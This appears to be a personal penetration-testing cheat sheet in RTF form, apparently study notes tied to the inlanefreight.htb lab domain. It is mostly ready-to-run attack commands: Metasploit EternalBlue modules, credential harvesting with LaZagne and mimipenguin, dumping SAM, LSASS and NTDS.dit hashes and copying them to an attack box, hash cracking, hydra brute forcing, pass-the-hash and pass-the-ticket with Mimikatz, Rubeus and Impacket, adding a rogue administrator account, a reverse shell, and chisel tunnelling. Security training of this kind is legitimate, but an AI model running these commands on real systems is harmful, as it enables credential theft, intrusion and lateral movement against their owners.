\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Metasploit
\f1\b0 :\
modules are in /usr/share/metasploit-framework/modules\
\'a7 sudo apt update && sudo apt install metasploit-framework	:install and update\
> auxiliary(scanner/smb/smb_ms17_010)				:determines if target is vulnerable to eternal blue\
> exploit/windows/smb/ms17_010_psexec				:exploit eternal blue\
> search type:exploit platform:windows cve:2021 rank:excellent eternalblue                      (Search for specifics)\
exploit($module) > info								:shows detailed info about a module\
> grep meterpreter grep reverse_tcp show payloads			:grepping multiple words\
> grep meterpreter show payloads						:using grep\
> show payloads\
> show encoders\
> load $pluginname								:loads a plugin from /usr/share/metasploit-framework/plugins/\
\
> background									:put session in background (or use ctrl+z)\
> sessions										:view all sessions\
> sessions -i $no.								:interact with specific session\
\
> exploit -j										:run exploit as job\
> jobs -l										:lists all jobs\
\
Using Databse:\
   \'a7 sudo service postgresql status						:checks status\
   \'a7 sudo systemctl start postgresql						:starts database\
   \'a7 sudo msfdb init								:initialize the MSF database\
   \'a7 sudo msfdb status								:check status of db\
   \'a7 sudo msfdb run								:connect to db with msf\
\cb28 \'a7 \cb1 msfdb reinit										         (if not able to change the password to the MSF username, reinitiate the Database)\
\cb28 \'a7 \cb1 cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/\
\cb28 \'a7 \cb1 sudo service postgresql restart\
\cb28 \'a7 \cb1 msfconsole -q\
> db_status\
> workspace									:view the current Workspace list\
> workspace -a $target								:add workspace\
> workspace -d $target								:delete workspace\
> workspace $target								:selects workspace to work with ( indicated by * )\
> db_import $nmaptarget.xml						:import nmap scan results to db\
> hosts										:shows IP\'92s of what you scanned (-h for options)\
> services										:shows results of scans (-h for options)\
> creds										:shows all gathered credentials (-h for options)\
> loot											:shows collected juicy info (-h for options)\
> db_nmap -sV -sS $ip								:Nmap scan straight form console\
> db_export -f xml $backup.xml						:export db to local machine into file\
\
To use downloaded MSF exploits (Ruby files)\
\'a7 searchsploit $keywork\
\'a7 locate exploits									:see which directory is housing the ruby files for MSF (/usr/share/metasploit-framework/ or ~/.msf4/)\
copy ruby file into directory with approprate permissions (chmod 644)\
\'a7 msfconsole -m /usr/share/metasploit-framework/modules/\
> loadpath /usr/share/metasploit-framework/modules/                 or     > reload_all\
\
meterpreter> load kiwi								:new version of mimikatz\
meterpreter> lsa_dump_sam							:dump NTLM hashes \
> post(multi/recon/local_exploit_suggester)				:suggests exploits from session, like to escalate privileges \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Remote Desktop RDP
\f1\b0 :\
Remmina         (linux to windows)\
mstsc.exe          (from windows to windows)\
\'a7 xfreerdp /v:$ip /u:$user /p:$pass\
\'a7 sudo gem install evil-winrm							:like the ssh of windows\
    \'a7 evil-winrm -i $ip -u $user -p $pass					:example usage of evil-winrm\
    \'a7 evil-winrm -i $ip  -u  $user -H "$hash"				:Pass-the-Hash (PtH) with Evil-WinRM\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Credential Hunting
\f1\b0 :\
Windows:\
 github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe                                 (lazagne.exe should be moved to compromised box)\
  C:> start lazagne.exe all							:search target for credentials\
C:> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml                                      (native windows tool for file finding)\
\
Linux:\
\'a7 for l in $(echo ".conf .config .cnf");do echo -e "\\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\\|fonts\\|share\\|core" ;done            (searches for configuration files)\
\'a7 for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\\|lib");do echo -e "\\nFile: " $i; grep "user\\|password\\|pass" $i 2>/dev/null | grep -v "\\#";done             (scans each file found with the specified file extension and output the contents. In this example, we search for three words (user, password, pass) in each file with the file extension .cnf)\
\'a7 for l in $(echo ".sql .db .*db .db*");do echo -e "\\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\\|lib\\|headers\\|share\\|man";done       (searches for database files)\
\'a7 find /home/* -type f -name "*.txt" -o ! -name "*.*"			:search for files including the .txt file extension and files that have no file extension at all from /home/\
\'a7 for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\\|lib\\|headers\\|share";done         (searches for script files)\
\'a7 grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"	:search for the string \'93PRIVATE KEY" recursively in all files under the /home directory (for ssh priv keys)\
\'a7 grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"			:same as previous but for public keys\
\'a7 tail -n5 /home/*/.bash*							:checks to see bash history files in /home/\
\'a7 for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\\n#### Log file: " $i; grep "accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs" $i 2>/dev/null;fi;done                   (find interesting content in logs)\
\'a7 sudo python3 mimipenguin.py						:takes advantage of cleartext credentials in memory by dumping the process (needs root privs) or \'91sudo bash mimipenguin.sh'\
\'a7 sudo python2.7 laZagne.py all						:raw.githubusercontent.com/AlessandroZ/LaZagne/master/Linux/laZagne.py\
\'a7 python3 laZagne.py browsers						:tries to find browser dredentials\
\cb29 \'a7 \cb1 ls -l .mozilla/firefox/ | grep default					:check for the mozilla profiles/credentials folder\
\cb29 \'a7 \cb1 cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .	:see encrypted usernames and passwords\
\cb29 \'a7 \cb1 python3.9 firefox_decrypt.py						:decrypts credentials\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Passwords
\f1\b0 :\
Default creds: github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv\
\
	in Linux\
/etc/security/opasswd contain old passwords\
/etc/shadow contain hashes\
$1$		MD5\
$2a$		Blowfish\
$5$		SHA-256\
$6$		SHA-512\
$sha1$	SHA1crypt\
$y$		Yescrypt\
$gy$		Gost-yescrypt\
$7$		Scrypt\
\
Cracking Linux passwords:\
\'a7 sudo cp /etc/passwd /tmp/passwd.bak \
\'a7 sudo cp /etc/shadow /tmp/shadow.bak \
\'a7 unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes\
\'a7 hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked                         cracking SHA-512 hashes (default hashes for modern linux)\
   \'a7 hashcat -m 500 -a 0 md5-hashes.list rockyou.txt				:cracking md5 hashes (put hashes into file each hash on one line)\
\
	in Windows \
%SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it\
	hklm/sam				:sam registry hive\
	hklm/system			:can backup using reg.exe \
	hklm/security			:eg: \cb7 C:>\cb1  reg.exe save hklm\\sam C:\\sam.save\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb30 \'a7 \cb1 sudo python3 smbserver.py -smb2support CompData /home/Documents/                                         (creating a Share on attack box so target can send files)\
   \cb30 C:>\cb1  move sam.save \\\\$ip\\CompData						                                                 (move files from target to attack box by specifying share)\
\cb30 \'a7 \cb1 python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL            (dumping hashes we saved in attack box)\
put hashes into text file\
\cb30 \'a7 \cb1 sudo hashcat -m 1000 hashestocrack.txt rockyou.txt   	   	 	                                                      (attempt to crack NTLM hashes with rockyou)\
\'a7 crackmapexec smb $ip --local-auth -u $user -p $pass --lsa		:dumping LSA Secrets Remotely\
\'a7 crackmapexec smb $ip --local-auth -u $user -p $pass --sam		:dumping SAM Remotely\
    to \cb8 dump LSASS\cb1  in memory using \cb8 GUI\cb1 : Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file \
           (saved in C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp)\
    to \cb31 dump LSASS using cmd\cb1 :\
        C:> tasklist /svc					:find lsass.exe and its process ID in the PID field\
        PS C:> Get-Process lsass			:find lsass and its process ID in the Id field\
        PS C:> rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full                          (create the dump file and put into C:\\lsass.dmp)\
        \'a7 pypykatz lsa minidump $dumpfile.dmp		                                                                        (on attack box, parse dump and get creds)\
\
if the system joined to domain, Domain Controller must validate credentials from AD database (ntds.dit), which is stored in %SystemRoot%\\ntds.dit\
To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) rights\
PS :C> net localgroup						:checking Local Group Membership of current user\
PS :C> net user $username					:checking User Account Privileges including Domain\
PS :C> vssadmin CREATE SHADOW /For=C:		:creating Shadow Copy of C: drive\
PS :C> cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit                 (Copying NTDS.dit from the VSS)\
PS :C> cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\$ip\\CompData                                 (move dit file from DC to attack box that has smbserver.py running)\
or\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb27 \'a7 \cb1 crackmapexec smb $ip -u $user -p $pass --ntds				:capture and dump the contents of the NTDS.dit file remotely\
\
JohnTheRipper:\
kali.org/tools/john/\
pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats		:list of --format possibilities\
Outputs cracked passwords to the console and ~/.john/john.pot\
\'a7 john --format=<hash_type> <hash or hash_file>				:single crack mode\
\'a7 john --show										:check the progress of cracking\
\'a7 john --wordlist=<wordlist_file> --rules <hash_file>				:crack passwords using multiple lists of words\
\'a7 john --incremental <hash_file>							:generate all combinations, starting with single character and incrementing with each iteration\
\cb8 \'a7 \cb1 <tool> <file_to_crack> > file.hash						:cracking password protected files\
\cb8 \'a7 \cb1 pdf2john server_doc.pdf > server_doc.hash					:run locate *2john* to see all file cracking options\
\cb8 \'a7 \cb1 john server_doc.hash\
\cb8 \'a7 \cb1 john --wordlist=<wordlist.txt> server_doc.hash\
\
Crackmapexec:\
\'a7 sudo apt-get -y install crackmapexec						:installs crackmap\
\'a7 crackmapexec $proto $ip -u $user/list -p $pass/list				:tries to crack password of service\
   eg: crackmapexec winrm $ip -u user.list -p password.list			:tries cracking WinRM user and pass\
\'a7 crackmapexec smb $ip -u "user" -p "password" --shares			:tries to see which shares exist and what privileges we have for them\
\'a7 crackmapexec smb $ip -u user -p $passfile					:using SMB to attempt to logon as user using password list \
\'a7 crackmapexec smb $ip --local-auth -u $user -p $pass --lsa		:dumping LSA Secrets Remotely\
\'a7 crackmapexec smb $ip --local-auth -u $user -p $pass --sam		:dumping SAM Remotely\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb6 \'a7 \cb1 crackmapexec smb $ip -u $user -p $pass --ntds				:capture and dump the contents of the NTDS.dit file remotely\
\
Hydra:\
\'a7 hydra -L user.list -P password.list ssh://$ip					:brute force ssh\
\'a7 hydra -L user.list -P password.list rdp://$ip					:brute force RDP\
\'a7 hydra -L user.list -P password.list smb://$ip					:brute force smb\
\'a7 hydra -C user_pass.list ssh://$ip							:credential stuffing ssh, (like admin:admin)\
\'a7 \
\
Hashcat:\
:		Do nothing.\
l		Lowercase all letters.\
u		Uppercase all letters.\
c		Capitalize the first letter and lowercase others.\
sXY		Replace all instances of X with Y.\
$!		Add the exclamation character at the end.\
\
\'a7 hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u		:tries all combinations of upper case letters and numbers for an eight-character password\
\'a7 hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list                    (Generating Rule-based Wordlist)\
\'a7 cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist                       (scan potential words from the company's website and save them in a separate list)\
\cb6 \'a7 \cb1 sudo hashcat -m 1000 hashestocrack.txt rockyou.txt   			:attempt to crack NTLM hashes in file with rockyou\
\'a7 sudo hashcat -m 1000 $hash rockyou.txt					:tries to crack an NT hash with rockyou\
\
\'a7 ./username-anarchy -i $names.txt						:username generator from names list\
\
Cracking Files:\
\'a7 for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\\|fonts\\|share\\|core" ;done\
                                (checks if files with certain extensions exist on system)\
\'a7 grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"			:looks for ssh keys on system\
\'a7 locate *2john*										:check available John Hashing Scripts\
\'a7 ssh2john.py SSH.private > ssh.hash						:convert ssh key into hash for us to crack\
\'a7 john --wordlist=rockyou.txt ssh.hash						:try cracking ssh key\
\'a7 john ssh.hash --show									:display the cracked hashes\
\
\'a7 for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in $file.gzip -k $i 2>/dev/null| tar xz;done \
\
\'a7 bitlocker2john -i Backup.vhd > backup.hashes				:cracking bitlocker files\
\'a7 grep "bitlocker\\$0" backup.hashes > backup.hash\
\'a7 hashcat -m 22100 backup.hash rockyou.txt -o backup.cracked	:cat the output file to see the password\
\'a7 \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\b \cf0 Pass the Hash (PtH)
\f1\b0 :\
Mimikatz:\
# privilege::debug\
# token::elevate\
# lsadump::sam\
# lsadump::sam\
# sekurlsa::msv\
C:> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:$hash /domain:$domain /run:cmd.exe" exit                        (PtH with mimikatz example)\
\
\cb12 PS C:>\cb1  Import-Module .\\Invoke-TheHash.psd1                     (github.com/Kevin-Robertson/Invoke-TheHash)\
\cb12 PS C:>\cb6  \cb1 Invoke-SMBExec -Target $ip -Domain inlanefreight.htb -Username julio -Hash $hash -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose                       (will use the SMB method for command execution to create a new user mark and add user to Administrators group)\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb32 PS C:>\cb1  Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash $hash -Command "powershell -e $base64encodedreverseshellcommand"           (get reverse shell)\
\'a7 impacket-psexec administrator@10.129.201.126 -hashes :$hash                                       (PtH on Linux using Impacket, can also use wmiexec, atexec, smbexec)\
\'a7 crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H $hash                                       (PtH with crackmapexec)\
\'a7 crackmapexec smb $ip -u $user -H $hash                                                                          (PtH with crackmapexec)\
\'a7 crackmapexec smb 10.129.201.126 -u Administrator -d . -H $hash -x whoami                      (PtH with command execution)\
\'a7 evil-winrm -i 10.129.201.126 -u Administrator -H $hash                                              (PtH with winrm, when using domain account include the domain name eg: administrator@example.com)\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb33 C:>\cb1  reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f             (enable Restricted Admin Mode to Allow PtH for RDP)\
\cb33 C:>\cb1  xfreerdp  /v:10.129.201.126 /u:julio /pth:$hash                                                      (PtH with RDP)\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Pass the Ticket (PtT)
\f1\b0 :\
Rubeus:\
C:> Rubeus.exe dump /nowrap							:dump all tickets (if local administrator) and print ticket encoded in base64\
\
C:> Rubeus.exe createnetonly /program:"C:\\Windows\\System32\\cmd.exe" /show           (Create a Sacrificial Process with Rubeus, this will open new cmd)\
C:> Rubeus.exe asktgt /user:$user /domain:$domain /aes256:$hash /ptt                        (request a new TGT with the option /ptt to import the ticket into our current session)\
C:> powershell\
C:> Enter-PSSession -ComputerName DC01					:connect to the DC using PowerShell Remoting\
\
Mimikatz:\
# privilege::debug\
# token::elevate\
# sekurlsa::tickets /export								:list of files with the extension .kirbi, which contain the tickets\
C:> dir *.kirbi										:to see the tickets\
\
# privilege::debug\
# kerberos::ptt \'93C:\\$file.kirbi"								:Pass the Ticket attack using Mimikatz, specify file that contains the ticket we want to import\
# exit\
C:> Enter-PSSession -ComputerName DC01					:PowerShell Remoting with Pass the Ticket, move laterally\
\
# privilege::debug		forge our own tickets(OverPass the Hash)\
# sekurlsa::ekeys									:dump all users Kerberos encryption keys and AES hashes\
# sekurlsa::pth /domain:$domain /user:$user /ntlm:$hash			:create new cmd.exe we can use to request access to any service we want in context of target user\
C:> Rubeus.exe asktgt /domain:$domain /user:$user /aes256:$hash /nowrap             (forge a ticket using Rubeus with aes256 hash from info collected in Mimikatz sekurlsa::ekeys)\
											 	                                                     (outputs ticket in base64)\
C:> Rubeus.exe asktgt /domain:$domain /user:$user /rc4:$hash /ptt                           (submit the ticket (TGT or TGS) to the current logon session using asktgt)\
C:> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi               (sumbit ticket to current login session using .kirbi file)\
C:> Rubeus.exe ptt /ticket:$encodedticktbase64				                                     (Pass the Ticket providing the base64 string instead of the file name)\
PS> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))          (convert kirbi to base64)\
\
On Linux:\
tickets usually in /tmp\
or in /etc/krb5.keytab \
   ticket is stored in the environment variable KRB5CCNAME by default\
   \'a7 env | grep -i krb5              (see where file is)\
\'a7 realm list											:check If Linux Machine is Domain Joined\
\'a7 ps -ef | grep -i "winbind\\|sssd"							:check If Linux Machine is Domain Joined\
\'a7 find / -name *keytab* -ls 2>/dev/null						:search for keytab files on computer\
\'a7 crontab -l											:check if Keytab Files in Cronjobs, or any other scripts for that matter\
impersonate a user using 
\f2\i kinit
\f1\i0 \
klist shows which file keytab was made for\
\'a7 klist -k -t 											:listing keytab File Information\
\'a7 kinit $user@$domain -k -t /opt/specialfiles/carlos.keytab			:impersonating a User with a keytab\
\'a7 python3 /opt/keytabextract.py $keytabfile					:extracting Keytab Hashes with KeyTabExtract\
\cb34 \'a7 \cb1 cp /tmp/krb5cc_647401106_I8I133 .						:Importing the ccache File into our Current Session\
\cb34 \'a7 \cb1 export KRB5CCNAME=/root/krb5cc_647401106_I8I133			:ensure KRB5CCNAME env variable is set to ccache file we want to use\
\cb34 \'a7 \cb1 klist												:klist displays the ticket information, like "valid starting" and "expires."\
\'a7 smbclient //dc01/carlos -k -c ls							:connecting to SMB Share as Carlos\
\
Using Linux Attack Tools with Kerberos\
modify /etc/hosts\
also modify /etc/proxychains.conf to use sock5 and port 1080\
  \'a7 wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz                   (download chisel)\
  \'a7 gzip -d chisel_1.7.7_linux_amd64.gz\
  \'a7 mv chisel_* chisel && chmod +x ./chisel\
  \'a7 sudo ./chisel server --reverse							:start chisel on attack box\
connect to AD machine with RDP\
C:> chisel.exe client 10.10.14.33:8080 R:socks				:execute chisel on AD machine, client is attack box\
\'a7 export KRB5CCNAME=$pathtoccachefile					:set KRB5CCNAME env variable on attack box to ccache file(after managing to transfer it)\
\'a7 proxychains impacket-wmiexec ms01 -k					:use Impacket with proxychains and Kerberos Authentication to connect to AD machine\
  can also use evil-winrm with kerberos\
  \'a7 sudo apt-get install krb5-user -y							:install Kerberos Authentication Package for winrm\
  edit /etc/krb5.conf file to include domain and DC\
  \'a7 proxychains evil-winrm -i dc01 -r inlanefreight.htb				:connect to AD machine with kerberos evil-winrm\
\
\'a7 impacket-ticketConverter $ccachefile $kirbifile				:convert ccache file to kirbi\
C:> Rubeus.exe ptt /ticket:c:\\tools\\$kirbifile					:import Converted Ticket into Windows Session with Rubeus\
\
\'a7 wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh\
\'a7 /opt/linikatz.sh										:extract all credentials, including Kerberos tickets (should be root)\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Active Directory
\f1\b0 :\
PS C:> Get-ADGroup -Identity "Server Operators" -Properties *		                               (see Server Operators Group Details)\
PS C:> Get-ADGroup -Identity "Domain Admins" -Properties * | select DistinguishedName,GroupCategory,GroupScope,Name,Members           (see Domain Admins Group Membership)\
PS C:> whoami /priv								          (listing of all user rights assigned to the current user)\
PS C:> \
PS C:> \
PS C:> \
\
\
\
\
\
\
}